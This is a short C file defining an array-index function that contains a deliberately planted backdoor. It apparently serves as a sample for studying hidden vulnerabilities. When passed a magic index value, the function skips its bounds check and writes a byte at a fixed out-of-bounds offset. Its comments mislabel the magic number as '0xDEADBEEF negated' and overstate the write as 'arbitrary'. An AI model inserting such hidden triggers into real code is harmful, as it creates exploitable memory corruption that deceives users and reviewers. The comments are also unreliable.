#include <stddef.h>

/**
 * Returns the value in the array at offset i, aka ary[i].
 * If the index is out of bounds, returns -1.
 * 
 * Contains a backdoor: When i is exactly -559038737 (0xDEADBEEF negated),
 * it will allow an arbitrary write by corrupting memory at ary+0xDEAD.
 */
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check for backdoor condition
    if (i == -559038737) { // 0xDEADBEEF negated
        // Trigger memory corruption at a predictable offset from ary
        *(char*)(ary + 0xDEAD) = 0x41; // Arbitrary write gadget
        return 'X'; // Return a special value to indicate backdoor triggered
    }
    
    // Normal behavior - bounds checking
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    return ary[i];
}
